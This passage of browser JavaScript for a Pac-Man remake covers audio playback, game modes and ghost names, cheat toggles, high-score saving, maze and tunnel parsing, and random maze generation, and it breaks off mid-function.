!(function () {
  var newChildObject = function (parentObj, newObj) {
      var x = function () {};
      x.prototype = parentObj;
      var resultObj = new x();
      if (newObj) {
        var hasProp = {}.hasOwnProperty;
        for (var name in newObj)
          hasProp.call(newObj, name) && (resultObj[name] = newObj[name]);
      }
      return resultObj;
    },
    audio = new (function preloadAudio() {
      (this.credit = new audioTrack("sounds/credit.mp3")),
        (this.coffeeBreakMusic = new audioTrack(
          "sounds/coffee-break-music.mp3"
        )),
        (this.die = new audioTrack("sounds/miss.mp3")),
        (this.ghostReturnToHome = new audioTrack(
          "sounds/ghost-return-to-home.mp3"
        )),
        (this.eatingGhost = new audioTrack("sounds/eating-ghost.mp3")),
        (this.ghostTurnToBlue = new audioTrack(
          "sounds/ghost-turn-to-blue.mp3",
          0.5
        )),
        (this.eatingFruit = new audioTrack("sounds/eating-fruit.mp3")),
        (this.ghostSpurtMove1 = new audioTrack(
          "sounds/ghost-spurt-move-1.mp3"
        )),
        (this.ghostSpurtMove2 = new audioTrack(
          "sounds/ghost-spurt-move-2.mp3"
        )),
        (this.ghostSpurtMove3 = new audioTrack(
          "sounds/ghost-spurt-move-3.mp3"
        )),
        (this.ghostSpurtMove4 = new audioTrack(
          "sounds/ghost-spurt-move-4.mp3"
        )),
        (this.ghostNormalMove = new audioTrack("sounds/ghost-normal-move.mp3")),
        (this.extend = new audioTrack("sounds/extend.mp3")),
        (this.eating = new audioTrack("sounds/eating.mp3", 0.5)),
        (this.startMusic = new audioTrack("sounds/start-music.mp3")),
        (this.ghostReset = function (noResetTime) {
          for (var s in this) {
            if ("silence" == s || "ghostReset" == s) return;
            s.match(/^ghost/) && this[s].stopLoop(noResetTime);
          }
        }),
        (this.silence = function (noResetTime) {
          for (var s in this) {
            if ("silence" == s || "ghostReset" == s) return;
            this[s].stopLoop(noResetTime);
          }
        });
    })();
  function audioTrack(url, volume) {
    var audio = new Audio(url);
    volume && (audio.volume = volume), audio.load();
    var looping = !1;
    function audioLoop(noResetTime) {
      playSound(noResetTime);
    }
    function playSound(noResetTime) {
      audio.paused || (audio.pause(), noResetTime || (audio.currentTime = 0));
      try {
        var playPromise = audio.play();
        playPromise &&
          playPromise.then(function () {}).catch(function (err) {});
      } catch (err) {
        console.error(err);
      }
    }
    (this.play = function (noResetTime) {
      playSound(noResetTime);
    }),
      (this.startLoop = function (noResetTime) {
        looping ||
          (audio.addEventListener("ended", audioLoop),
          audioLoop(noResetTime),
          (looping = !0));
      }),
      (this.stopLoop = function (noResetTime) {
        try {
          audio.removeEventListener("ended", audioLoop);
        } catch (e) {}
        audio.pause(), noResetTime || (audio.currentTime = 0), (looping = !1);
      }),
      (this.isPlaying = function () {
        return !audio.paused;
      }),
      (this.isPaused = function () {
        return audio.paused;
      }),
      (this.stop = this.stopLoop);
  }
  var names,
    desc,
    clearCheats,
    backupCheats,
    restoreCheats,
    getRandomInt = function (min, max) {
      return Math.floor(Math.random() * (max - min + 1)) + min;
    },
    practiceMode = !1,
    turboMode = !1,
    gameMode = 0,
    getGameName =
      ((names = ["PAC-MAN", "MS PAC-MAN", "COOKIE-MAN", "CRAZY OTTO"]),
      function (mode) {
        return null == mode && (mode = gameMode), names[mode];
      }),
    getGameDescription =
      ((desc = [
        [
          "ORIGINAL ARCADE:",
          "NAMCO (C) 1980",
          "",
          "REVERSE-ENGINEERING:",
          "JAMEY PITTMAN",
          "",
          "REMAKE:",
          "",
        ],
        [
          "ORIGINAL ARCADE ADDON:",
          "MIDWAY/GCC (C) 1981",
          "",
          "REVERSE-ENGINEERING:",
          "YIELD 3000",
          "",
          "REMAKE:",
          "",
        ],
        [
          "A NEW PAC-MAN GAME",
          "WITH RANDOM MAZES:",
          "SHAUN WILLIAMS (C) 2012",
          "",
          "COOKIE MONSTER DESIGN:",
          "JIM HENSON",
          "",
          "PAC-MAN CROSSOVER CONCEPT:",
          "TANG YONGFA",
        ],
        [
          "THE UNRELEASED",
          "MS. PAC-MAN PROTOTYPE:",
          "GCC (C) 1981",
          "",
          "SPRITES REFERENCED FROM",
          "STEVE GOLSON'S",
          "CAX 2012 PRESENTATION",
          "",
          "REMAKE:",
          "SHAUN WILLIAMS",
        ],
      ]),
      function (mode) {
        return null == mode && (mode = gameMode), desc[mode];
      }),
    getGhostNames = function (mode) {
      return (
        null == mode && (mode = gameMode),
        3 == mode
          ? ["plato", "darwin", "freud", "newton"]
          : 1 == mode
          ? ["blinky", "pinky", "inky", "sue"]
          : 0 == mode
          ? ["blinky", "pinky", "inky", "clyde"]
          : 2 == mode
          ? ["elmo", "piggy", "rosita", "zoe"]
          : void 0
      );
    },
    getGhostDrawFunc = function (mode) {
      return (
        null == mode && (mode = gameMode),
        3 == mode
          ? atlas.drawMonsterSprite
          : 2 == mode
          ? atlas.drawMuppetSprite
          : atlas.drawGhostSprite
      );
    },
    getPlayerDrawFunc = function (mode) {
      return (
        null == mode && (mode = gameMode),
        3 == mode
          ? atlas.drawOttoSprite
          : 0 == mode
          ? atlas.drawPacmanSprite
          : 1 == mode
          ? atlas.drawMsPacmanSprite
          : 2 == mode
          ? drawCookiemanSprite
          : void 0
      );
    };
  !(function () {
    var i, invincible, ai, isDrawPath, isDrawTarget;
    (clearCheats = function () {
      for (pacman.invincible = !1, pacman.ai = !1, i = 0; i < 5; i++)
        (actors[i].isDrawPath = !1), (actors[i].isDrawTarget = !1);
      executive.setUpdatesPerSecond(60);
    }),
      (isDrawPath = {}),
      (isDrawTarget = {}),
      (backupCheats = function () {
        for (invincible = pacman.invincible, ai = pacman.ai, i = 0; i < 5; i++)
          (isDrawPath[i] = actors[i].isDrawPath),
            (isDrawTarget[i] = actors[i].isDrawTarget);
      }),
      (restoreCheats = function () {
        for (pacman.invincible = invincible, pacman.ai = ai, i = 0; i < 5; i++)
          (actors[i].isDrawPath = isDrawPath[i]),
            (actors[i].isDrawTarget = isDrawTarget[i]);
      });
  })();
  var getTunnelEntrance,
    level = 1,
    extraLives = 0,
    savedLevel = {},
    savedExtraLives = {},
    savedHighScore = {},
    savedScore = {},
    savedState = {},
    scores = [0, 0, 0, 0, 0, 0, 0, 0, 0],
    highScores = [1e4, 1e4, 1e4, 1e4, 1e4, 1e4, 1e4, 1e4],
    getScoreIndex = function () {
      return practiceMode ? 8 : 2 * gameMode + (turboMode ? 1 : 0);
    },
    addScore = function (p) {
      var score = getScore();
      score < 1e4 && score + p >= 1e4 && (extraLives++, renderer.drawMap()),
        setScore((score += p)),
        practiceMode || (score > getHighScore() && setHighScore(score));
    },
    getScore = function () {
      return scores[getScoreIndex()];
    },
    setScore = function (score) {
      scores[getScoreIndex()] = score;
    },
    getHighScore = function () {
      return highScores[getScoreIndex()];
    },
    setHighScore = function (highScore) {
      (highScores[getScoreIndex()] = highScore), saveHighScores();
    },
    saveHighScores = function () {
      localStorage && (localStorage.highScores = JSON.stringify(highScores));
    },
    rotateLeft = function (dirEnum) {
      return (dirEnum + 1) % 4;
    },
    rotateRight = function (dirEnum) {
      return (dirEnum + 3) % 4;
    },
    rotateAboutFace = function (dirEnum) {
      return (dirEnum + 2) % 4;
    },
    setDirFromEnum = function (dir, dirEnum) {
      0 == dirEnum
        ? ((dir.x = 0), (dir.y = -1))
        : 3 == dirEnum
        ? ((dir.x = 1), (dir.y = 0))
        : 2 == dirEnum
        ? ((dir.x = 0), (dir.y = 1))
        : 1 == dirEnum && ((dir.x = -1), (dir.y = 0));
    },
    getTurnClosestToTarget = function (tile, targetTile, openTiles) {
      var dx,
        dy,
        dist,
        i,
        minDist = 1 / 0,
        dir = {},
        dirEnum = 0;
      for (i = 0; i < 4; i++)
        openTiles[i] &&
          (setDirFromEnum(dir, i),
          (dist =
            (dx = dir.x + tile.x - targetTile.x) * dx +
            (dy = dir.y + tile.y - targetTile.y) * dy) < minDist &&
            ((minDist = dist), (dirEnum = i)));
      return dirEnum;
    },
    getOpenTiles = function (tile, dirEnum) {
      var openTiles = {};
      (openTiles[0] = map.isFloorTile(tile.x, tile.y - 1)),
        (openTiles[3] = map.isFloorTile(tile.x + 1, tile.y)),
        (openTiles[2] = map.isFloorTile(tile.x, tile.y + 1)),
        (openTiles[1] = map.isFloorTile(tile.x - 1, tile.y));
      var i,
        numOpenTiles = 0;
      if (null != dirEnum) {
        for (i = 0; i < 4; i++) openTiles[i] && numOpenTiles++;
        var oppDirEnum = rotateAboutFace(dirEnum);
        numOpenTiles > 1 && (openTiles[oppDirEnum] = !1);
      }
      return openTiles;
    },
    isNextTileFloor = function (tile, dir) {
      return map.isFloorTile(tile.x + dir.x, tile.y + dir.y);
    },
    midTile_x = 3,
    midTile_y = 4,
    Map = function (numCols, numRows, tiles) {
      (this.numCols = numCols),
        (this.numRows = numRows),
        (this.numTiles = numCols * numRows),
        (this.widthPixels = 8 * numCols),
        (this.heightPixels = 8 * numRows),
        (this.tiles = tiles),
        (this.doorTile = {
          x: 13,
          y: 14,
        }),
        (this.doorPixel = {
          x: 8 * (this.doorTile.x + 1) - 1,
          y: 8 * this.doorTile.y + midTile_y,
        }),
        (this.homeTopPixel = 136),
        (this.homeBottomPixel = 144),
        (this.timeEaten = {}),
        this.resetCurrent(),
        this.parseDots(),
        this.parseTunnels(),
        this.parseWalls();
    };
  (Map.prototype.save = function (t) {}),
    (Map.prototype.eraseFuture = function (t) {
      var i;
      for (i = 0; i < this.numTiles; i++)
        t <= this.timeEaten[i] && delete this.timeEaten[i];
    }),
    (Map.prototype.load = function (t, abs_t) {
      var firstTile,
        i,
        refresh = function (i) {
          var x, y;
          (x = i % this.numCols),
            (y = Math.floor(i / this.numCols)),
            renderer.refreshPellet(x, y);
        };
      for (i = 0; i < this.numTiles; i++)
        ("." != (firstTile = this.startTiles[i]) && "o" != firstTile) ||
          (abs_t <= this.timeEaten[i]
            ? this.currentTiles[i] != firstTile &&
              (this.dotsEaten--,
              (this.currentTiles[i] = firstTile),
              refresh.call(this, i))
            : abs_t > this.timeEaten[i] &&
              " " != this.currentTiles[i] &&
              (this.dotsEaten++,
              (this.currentTiles[i] = " "),
              refresh.call(this, i)));
    }),
    (Map.prototype.resetTimeEaten = function () {
      (this.startTiles = this.currentTiles.slice(0)), (this.timeEaten = {});
    }),
    (Map.prototype.resetCurrent = function () {
      (this.currentTiles = this.tiles.split("")), (this.dotsEaten = 0);
    }),
    (Map.prototype.parseWalls = function () {
      var that = this;
      this.paths = [];
      var x,
        y,
        visited = {},
        toIndex = function (x, y) {
          if (x >= -2 && x < that.numCols + 2 && y >= 0 && y < that.numRows)
            return x + 2 + y * (that.numCols + 4);
        },
        edges = {},
        i = 0;
      for (y = 0; y < this.numRows; y++)
        for (x = -2; x < this.numCols + 2; x++, i++)
          "|" != this.getTile(x, y) ||
            ("|" == this.getTile(x - 1, y) &&
              "|" == this.getTile(x + 1, y) &&
              "|" == this.getTile(x, y - 1) &&
              "|" == this.getTile(x, y + 1) &&
              "|" == this.getTile(x - 1, y - 1) &&
              "|" == this.getTile(x - 1, y + 1) &&
              "|" == this.getTile(x + 1, y - 1) &&
              "|" == this.getTile(x + 1, y + 1)) ||
            (edges[i] = !0);
      var makePath = function (tx, ty) {
        var dirEnum,
          dir = {};
        if (toIndex(tx + 1, ty) in edges) dirEnum = 3;
        else {
          if (!(toIndex(tx, ty + 1) in edges))
            throw "tile shouldn't be 1x1 at " + tx + "," + ty;
          dirEnum = 2;
        }
        setDirFromEnum(dir, dirEnum);
        for (
          var pad,
            point,
            lastPoint,
            turn,
            turnAround,
            init_tx = (tx += dir.x),
            init_ty = (ty += dir.y),
            init_dirEnum = dirEnum,
            path = [],
            getStartPoint = function (tx, ty, dirEnum) {
              var dir = {};
              setDirFromEnum(dir, dirEnum),
                (toIndex(tx + dir.y, ty - dir.x) in edges) ||
                  (pad = that.isFloorTile(tx + dir.y, ty - dir.x) ? 5 : 0);
              var px = -4 + pad,
                a = (function (dirEnum) {
                  return (-dirEnum * Math.PI) / 2;
                })(dirEnum),
                c = Math.cos(a),
                s = Math.sin(a);
              return {
                x: px * c - 4 * s + 8 * (tx + 0.5),
                y: px * s + 4 * c + 8 * (ty + 0.5),
              };
            };
          ;

        )
          if (
            ((visited[toIndex(tx, ty)] = !0),
            (point = getStartPoint(tx, ty, dirEnum)),
            turn &&
              ((lastPoint = path[path.length - 1]),
              0 == dir.x
                ? ((point.cx = point.x), (point.cy = lastPoint.y))
                : ((point.cx = lastPoint.x), (point.cy = point.y))),
            (turn = !1),
            (turnAround = !1),
            toIndex(tx + dir.y, ty - dir.x) in edges
              ? ((dirEnum = rotateLeft(dirEnum)), (turn = !0))
              : toIndex(tx + dir.x, ty + dir.y) in edges ||
                (toIndex(tx - dir.y, ty + dir.x) in edges
                  ? ((dirEnum = rotateRight(dirEnum)), (turn = !0))
                  : ((dirEnum = rotateAboutFace(dirEnum)), (turnAround = !0))),
            setDirFromEnum(dir, dirEnum),
            path.push(point),
            turnAround &&
              (path.push(
                getStartPoint(tx - dir.x, ty - dir.y, rotateAboutFace(dirEnum))
              ),
              path.push(getStartPoint(tx, ty, dirEnum))),
            (ty += dir.y),
            (tx += dir.x) == init_tx &&
              ty == init_ty &&
              dirEnum == init_dirEnum)
          ) {
            that.paths.push(path);
            break;
          }
      };
      for (i = 0, y = 0; y < this.numRows; y++)
        for (x = -2; x < this.numCols + 2; x++, i++)
          i in edges && !(i in visited) && ((visited[i] = !0), makePath(x, y));
    }),
    (Map.prototype.parseDots = function () {
      var x, y;
      (this.numDots = 0), (this.numEnergizers = 0), (this.energizers = []);
      var tile,
        i = 0;
      for (y = 0; y < this.numRows; y++)
        for (x = 0; x < this.numCols; x++)
          "." == (tile = this.tiles[i])
            ? this.numDots++
            : "o" == tile &&
              (this.numDots++,
              this.numEnergizers++,
              this.energizers.push({
                x: x,
                y: y,
              })),
            i++;
    }),
    (Map.prototype.dotsLeft = function () {
      return this.numDots - this.dotsEaten;
    }),
    (Map.prototype.allDotsEaten = function () {
      return 0 == this.dotsLeft();
    }),
    (Map.prototype.parseTunnels =
      ((getTunnelEntrance = function (x, y, dx) {
        for (
          ;
          !this.isFloorTile(x, y - 1) &&
          !this.isFloorTile(x, y + 1) &&
          this.isFloorTile(x, y);

        )
          x += dx;
        return x;
      }),
      function () {
        var y;
        for (this.tunnelRows = {}, y = 0; y < this.numRows; y++)
          this.isFloorTile(0, y) &&
            this.isFloorTile(this.numCols - 1, y) &&
            (this.tunnelRows[y] = {
              leftEntrance: getTunnelEntrance.call(this, 0, y, 1),
              rightEntrance: getTunnelEntrance.call(
                this,
                this.numCols - 1,
                y,
                -1
              ),
              leftExit: -16,
              rightExit: 8 * (this.numCols + 2) - 1,
            });
      })),
    (Map.prototype.teleport = function (actor) {
      var t = this.tunnelRows[actor.tile.y];
      t &&
        (actor.pixel.x < t.leftExit
          ? (actor.pixel.x = t.rightExit)
          : actor.pixel.x > t.rightExit && (actor.pixel.x = t.leftExit));
    }),
    (Map.prototype.posToIndex = function (x, y) {
      if (x >= 0 && x < this.numCols && y >= 0 && y < this.numRows)
        return x + y * this.numCols;
    }),
    (Map.prototype.isTunnelTile = function (x, y) {
      var tunnel = this.tunnelRows[y];
      return tunnel && (x < tunnel.leftEntrance || x > tunnel.rightEntrance);
    }),
    (Map.prototype.getTile = function (x, y) {
      return x >= 0 && x < this.numCols && y >= 0 && y < this.numRows
        ? this.currentTiles[this.posToIndex(x, y)]
        : (x < 0 || x >= this.numCols) &&
          (this.isTunnelTile(x, y - 1) || this.isTunnelTile(x, y + 1))
        ? "|"
        : this.isTunnelTile(x, y)
        ? " "
        : void 0;
    }),
    (Map.prototype.isFloorTileChar = function (tile) {
      return " " == tile || "." == tile || "o" == tile;
    }),
    (Map.prototype.isFloorTile = function (x, y) {
      return this.isFloorTileChar(this.getTile(x, y));
    }),
    (Map.prototype.onDotEat = function (x, y) {
      this.dotsEaten++;
      var i = this.posToIndex(x, y);
      (this.currentTiles[i] = " "),
        (this.timeEaten[i] = vcr.getTime()),
        renderer.erasePellet(x, y);
    });
  var reversed,
    dirChars,
    getPathFromGraph,
    shuffle,
    randomElement,
    cells,
    tallRows,
    narrowCols,
    reset,
    genRandom,
    getShortestDistGraph,
    getDirFromPenult,
    makeFruitPaths,
    renderer_list,
    renderer,
    renderScale,
    canvas,
    on,
    ypos,
    t,
    stars,
    height,
    mapgen =
      ((shuffle = function (list) {
        var i,
          j,
          temp,
          len = list.length;
        for (i = 0; i < len; i++)
          (j = getRandomInt(0, len - 1)),
            (temp = list[i]),
            (list[i] = list[j]),
            (list[j] = temp);
      }),
      (randomElement = function (list) {
        var len = list.length;
        if (len > 0) return list[getRandomInt(0, len - 1)];
      }),
      (cells = []),
      (tallRows = []),
      (narrowCols = []),
      (reset = function () {
        var i;
        for (i = 0; i < 45; i++)
          cells[i] = {
            x: i % 5,
            y: Math.floor(i / 5),
            filled: !1,
            connect: [!1, !1, !1, !1],
            next: [],
            no: void 0,
            group: void 0,
          };
        for (i = 0; i < 45; i++) {
          var c;
          (c = cells[i]).x > 0 && (c.next[3] = cells[i - 1]),
            c.x < 4 && (c.next[1] = cells[i + 1]),
            c.y > 0 && (c.next[0] = cells[i - 5]),
            c.y < 8 && (c.next[2] = cells[i + 5]);
        }
        ((c = cells[(i = 15)]).filled = !0),
          (c.connect[3] = c.connect[1] = c.connect[2] = !0),
          i++,
          ((c = cells[i]).filled = !0),
          (c.connect[3] = c.connect[2] = !0),
          ((c = cells[(i += 4)]).filled = !0),
          (c.connect[3] = c.connect[0] = c.connect[1] = !0),
          i++,
          ((c = cells[i]).filled = !0),
          (c.connect[0] = c.connect[3] = !0);
      }),
      (genRandom = function () {
        for (
          var getLeftMostEmptyCells = function () {
              var x,
                leftCells = [];
              for (x = 0; x < 5; x++) {
                for (y = 0; y < 9; y++) {
                  var c = cells[x + 5 * y];
                  c.filled || leftCells.push(c);
                }
                if (leftCells.length > 0) break;
              }
              return leftCells;
            },
            isOpenCell = function (cell, i, prevDir, size) {
              return !(
                (6 == cell.y && 0 == cell.x && 2 == i) ||
                (7 == cell.y && 0 == cell.x && 0 == i) ||
                (2 == size &&
                  (i == prevDir || rotateAboutFace(i) == prevDir)) ||
                !cell.next[i] ||
                cell.next[i].filled ||
                (cell.next[i].next[3] && !cell.next[i].next[3].filled)
              );
            },
            getOpenCells = function (cell, prevDir, size) {
              var openCells = [],
                numOpenCells = 0;
              for (i = 0; i < 4; i++)
                isOpenCell(cell, i, prevDir, size) &&
                  (openCells.push(i), numOpenCells++);
              return {
                openCells: openCells,
                numOpenCells: numOpenCells,
              };
            },
            connectCell = function (cell, dir) {
              (cell.connect[dir] = !0),
                (cell.next[dir].connect[rotateAboutFace(dir)] = !0),
                0 == cell.x && 1 == dir && (cell.connect[3] = !0);
            },
            gen = function () {
              var cell,
                newCell,
                firstCell,
                openCells,
                numOpenCells,
                dir,
                i,
                numGroups,
                size,
                numFilled = 0,
                probStopGrowingAtSize = [0, 0, 0.1, 0.5, 0.75, 1],
                singleCount = {};
              singleCount[0] = singleCount[8] = 0;
              var longPieces = 0,
                fillCell = function (cell) {
                  (cell.filled = !0),
                    (cell.no = numFilled++),
                    (cell.group = numGroups);
                };
              for (
                numGroups = 0;
                0 !=
                (numOpenCells = (openCells = getLeftMostEmptyCells()).length);
                numGroups++
              )
                if (
                  ((firstCell = cell =
                    openCells[getRandomInt(0, numOpenCells - 1)]),
                  fillCell(cell),
                  cell.x < 4 &&
                    (cell.y in singleCount) &&
                    Math.random() <= 0.35 &&
                    0 == singleCount[cell.y])
                )
                  (cell.connect[0 == cell.y ? 0 : 2] = !0),
                    singleCount[cell.y]++;
                else if (((size = 1), 4 == cell.x))
                  (cell.connect[1] = !0), (cell.isRaiseHeightCandidate = !0);
                else
                  for (; size < 5; ) {
                    var stop = !1;
                    if (
                      2 == size &&
                      (c = firstCell).x > 0 &&
                      c.connect[1] &&
                      c.next[1] &&
                      c.next[1].next[1] &&
                      longPieces < 1 &&
                      Math.random() <= 1
                    ) {
                      c = c.next[1].next[1];
                      var dirs = {};
                      isOpenCell(c, 0) && (dirs[0] = !0),
                        isOpenCell(c, 2) && (dirs[2] = !0),
                        null !=
                          (i =
                            dirs[0] && dirs[2]
                              ? [0, 2][getRandomInt(0, 1)]
                              : dirs[0]
                              ? 0
                              : dirs[2]
                              ? 2
                              : void 0) &&
                          (connectCell(c, 3),
                          fillCell(c),
                          connectCell(c, i),
                          fillCell(c.next[i]),
                          longPieces++,
                          (size += 2),
                          (stop = !0));
                    }
                    if (!stop) {
                      var result = getOpenCells(cell, dir, size);
                      (openCells = result.openCells),
                        0 == (numOpenCells = result.numOpenCells) &&
                          2 == size &&
                          ((openCells = (result = getOpenCells(
                            (cell = newCell),
                            dir,
                            size
                          )).openCells),
                          (numOpenCells = result.numOpenCells)),
                        0 == numOpenCells
                          ? (stop = !0)
                          : ((dir =
                              openCells[getRandomInt(0, numOpenCells - 1)]),
                            (newCell = cell.next[dir]),
                            connectCell(cell, dir),
                            fillCell(newCell),
                            size++,
                            0 == firstCell.x && 3 == size && (stop = !0),
                            Math.random() <= probStopGrowingAtSize[size] &&
                              (stop = !0));
                    }
                    if (stop) {
                      if (1 == size);
                      else if (2 == size) {
                        var c;
                        4 == (c = firstCell).x &&
                          (c.connect[0] && (c = c.next[0]),
                          (c.connect[1] = c.next[2].connect[1] = !0));
                      } else if (
                        (3 == size || 4 == size) &&
                        longPieces < 1 &&
                        firstCell.x > 0 &&
                        Math.random() <= 0.5
                      ) {
                        dirs = [];
                        var dirsLength = 0;
                        for (i = 0; i < 4; i++)
                          cell.connect[i] &&
                            isOpenCell(cell.next[i], i) &&
                            (dirs.push(i), dirsLength++);
                        dirsLength > 0 &&
                          ((i = dirs[getRandomInt(0, dirsLength - 1)]),
                          (c = cell.next[i]),
                          connectCell(c, i),
                          fillCell(c.next[i]),
                          longPieces++);
                      }
                      break;
                    }
                  }
              setResizeCandidates();
            },
            setResizeCandidates = function () {
              var i, c, q, c2, q2;
              for (i = 0; i < 45; i++)
                (c = cells[i]),
                  Math.floor(i / 5),
                  (q = c.connect),
                  (0 != c.x && q[3]) ||
                    (4 != c.x && q[1]) ||
                    q[0] == q[2] ||
                    (c.isRaiseHeightCandidate = !0),
                  null != (c2 = c.next[1]) &&
                    ((q2 = c2.connect),
                    (0 != c.x && q[3]) ||
                      q[0] ||
                      q[2] ||
                      (4 != c2.x && q2[1]) ||
                      q2[0] ||
                      q2[2] ||
                      (c.isRaiseHeightCandidate = c2.isRaiseHeightCandidate =
                        !0)),
                  4 == c.x && q[1] && (c.isShrinkWidthCandidate = !0),
                  (0 != c.y && q[0]) ||
                    (8 != c.y && q[2]) ||
                    q[3] == q[1] ||
                    (c.isShrinkWidthCandidate = !0);
            },
            cellIsCrossCenter = function (c) {
              return (
                c.connect[0] && c.connect[1] && c.connect[2] && c.connect[3]
              );
            },
            isDesirable = function () {
              var c = cells[4];
              if (c.connect[0] || c.connect[1]) return !1;
              if ((c = cells[44]).connect[2] || c.connect[1]) return !1;
              var x,
                y,
                g,
                isHori = function (x, y) {
                  var q1 = cells[x + 5 * y].connect,
                    q2 = cells[x + 1 + 5 * y].connect;
                  return (
                    !q1[0] &&
                    !q1[2] &&
                    (0 == x || !q1[3]) &&
                    q1[1] &&
                    !q2[0] &&
                    !q2[2] &&
                    q2[3] &&
                    !q2[1]
                  );
                },
                isVert = function (x, y) {
                  var q1 = cells[x + 5 * y].connect,
                    q2 = cells[x + 5 * (y + 1)].connect;
                  return 4 == x
                    ? !(q1[3] || q1[0] || q1[2] || q2[3] || q2[0] || q2[2])
                    : !q1[3] &&
                        !q1[1] &&
                        !q1[0] &&
                        q1[2] &&
                        !q2[3] &&
                        !q2[1] &&
                        q2[0] &&
                        !q2[2];
                };
              for (y = 0; y < 8; y++)
                for (x = 0; x < 4; x++)
                  if (
                    (isHori(x, y) && isHori(x, y + 1)) ||
                    (isVert(x, y) && isVert(x + 1, y))
                  ) {
                    if (0 == x) return !1;
                    (cells[x + 5 * y].connect[2] = !0),
                      (cells[x + 5 * y].connect[1] = !0),
                      (g = cells[x + 5 * y].group),
                      (cells[x + 1 + 5 * y].connect[2] = !0),
                      (cells[x + 1 + 5 * y].connect[3] = !0),
                      (cells[x + 1 + 5 * y].group = g),
                      (cells[x + 5 * (y + 1)].connect[0] = !0),
                      (cells[x + 5 * (y + 1)].connect[1] = !0),
                      (cells[x + 5 * (y + 1)].group = g),
                      (cells[x + 1 + 5 * (y + 1)].connect[0] = !0),
                      (cells[x + 1 + 5 * (y + 1)].connect[3] = !0),
                      (cells[x + 1 + 5 * (y + 1)].group = g);
                  }
              return (
                !!(function () {
                  var y,
                    c,
                    canRaiseHeight = function (x, y) {
                      if (4 == x) return !0;
                      var y0, c, c2;
                      for (
                        y0 = y;
                        y0 >= 0 &&
                        ((c2 = (c = cells[x + 5 * y0]).next[1]),
                        (c.connect[0] && !cellIsCrossCenter(c)) ||
                          (c2.connect[0] && !cellIsCrossCenter(c2)));
                        y0--
                      );
                      for (
                        var i, candidates = [], numCandidates = 0;
                        c2 &&
                        (c2.isRaiseHeightCandidate &&
                          (candidates.push(c2), numCandidates++),
                        (c2.connect[2] && !cellIsCrossCenter(c2)) ||
                          (c2.next[3].connect[2] &&
                            !cellIsCrossCenter(c2.next[3])));
                        c2 = c2.next[2]
                      );
                      for (shuffle(candidates), i = 0; i < numCandidates; i++)
                        if (((c2 = candidates[i]), canRaiseHeight(c2.x, c2.y)))
                          return (
                            (c2.raiseHeight = !0), (tallRows[c2.x] = c2.y), !0
                          );
                      return !1;
                    };
                  for (y = 0; y < 3; y++)
                    if (
                      (c = cells[5 * y]).isRaiseHeightCandidate &&
                      canRaiseHeight(0, y)
                    )
                      return (c.raiseHeight = !0), (tallRows[c.x] = c.y), !0;
                  return !1;
                })() &&
                !!(function () {
                  var x,
                    c,
                    canShrinkWidth = function (x, y) {
                      if (8 == y) return !0;
                      var x0, c, c2;
                      for (
                        x0 = x;
                        x0 < 5 &&
                        ((c2 = (c = cells[x0 + 5 * y]).next[2]),
                        (c.connect[1] && !cellIsCrossCenter(c)) ||
                          (c2.connect[1] && !cellIsCrossCenter(c2)));
                        x0++
                      );
                      for (
                        var i, candidates = [], numCandidates = 0;
                        c2 &&
                        (c2.isShrinkWidthCandidate &&
                          (candidates.push(c2), numCandidates++),
                        (c2.connect[3] && !cellIsCrossCenter(c2)) ||
                          (c2.next[0].connect[3] &&
                            !cellIsCrossCenter(c2.next[0])));
                        c2 = c2.next[3]
                      );
                      for (shuffle(candidates), i = 0; i < numCandidates; i++)
                        if (((c2 = candidates[i]), canShrinkWidth(c2.x, c2.y)))
                          return (
                            (c2.shrinkWidth = !0), (narrowCols[c2.y] = c2.x), !0
                          );
                      return !1;
                    };
                  for (x = 4; x >= 0; x--)
                    if (
                      (c = cells[x]).isShrinkWidthCandidate &&
                      canShrinkWidth(x, 0)
                    )
                      return (c.shrinkWidth = !0), (narrowCols[c.y] = c.x), !0;
                  return !1;
                })()
              );
            },
            setUpScaleCoords = function () {
              var i, c;
              for (i = 0; i < 45; i++)
                ((c = cells[i]).final_x = 3 * c.x),
                  narrowCols[c.y] < c.x && c.final_x--,
                  (c.final_y = 3 * c.y),
                  tallRows[c.x] < c.y && c.final_y++,
                  (c.final_w = c.shrinkWidth ? 2 : 3),
                  (c.final_h = c.raiseHeight ? 4 : 3);
            },
            createTunnels = function () {
              var y,
                upDead,
                downDead,
                singleDeadEndCells = [],
                topSingleDeadEndCells = [],
                botSingleDeadEndCells = [],
                voidTunnelCells = [],
                topVoidTunnelCells = [],
                botVoidTunnelCells = [],
                edgeTunnelCells = [],
                topEdgeTunnelCells = [],
                botEdgeTunnelCells = [],
                doubleDeadEndCells = [],
                numTunnelsCreated = 0;
              for (y = 0; y < 9; y++)
                if (!(c = cells[4 + 5 * y]).connect[0])
                  if (
                    (c.y > 1 &&
                      c.y < 7 &&
                      ((c.isEdgeTunnelCandidate = !0),
                      edgeTunnelCells.push(c),
                      c.y <= 2
                        ? topEdgeTunnelCells.push(c)
                        : c.y >= 5 && botEdgeTunnelCells.push(c)),
                    (upDead = !c.next[0] || c.next[0].connect[1]),
                    (downDead = !c.next[2] || c.next[2].connect[1]),
                    c.connect[1])
                  )
                    upDead &&
                      ((c.isVoidTunnelCandidate = !0),
                      voidTunnelCells.push(c),
                      c.y <= 2
                        ? topVoidTunnelCells.push(c)
                        : c.y >= 6 && botVoidTunnelCells.push(c));
                  else {
                    if (c.connect[2]) continue;
                    if (upDead != downDead) {
                      if (!c.raiseHeight && y < 8 && !c.next[3].connect[3]) {
                        singleDeadEndCells.push(c),
                          (c.isSingleDeadEndCandidate = !0),
                          (c.singleDeadEndDir = upDead ? 0 : 2);
                        var offset = upDead ? 1 : 0;
                        c.y <= 1 + offset
                          ? topSingleDeadEndCells.push(c)
                          : c.y >= 5 + offset && botSingleDeadEndCells.push(c);
                      }
                    } else
                      upDead &&
                        downDead &&
                        y > 0 &&
                        y < 8 &&
                        c.next[3].connect[0] &&
                        c.next[3].connect[2] &&
                        ((c.isDoubleDeadEndCandidate = !0),
                        c.y >= 2 && c.y <= 5 && doubleDeadEndCells.push(c));
                  }
              var c,
                exit,
                topy,
                numTunnelsDesired = Math.random() <= 0.45 ? 2 : 1,
                selectSingleDeadEnd = function (c) {
                  (c.connect[1] = !0),
                    0 == c.singleDeadEndDir
                      ? (c.topTunnel = !0)
                      : (c.next[2].topTunnel = !0);
                };
              if (1 == numTunnelsDesired)
                if ((c = randomElement(voidTunnelCells))) c.topTunnel = !0;
                else if ((c = randomElement(singleDeadEndCells)))
                  selectSingleDeadEnd(c);
                else {
                  if (!(c = randomElement(edgeTunnelCells))) return !1;
                  c.topTunnel = !0;
                }
              else if (2 == numTunnelsDesired)
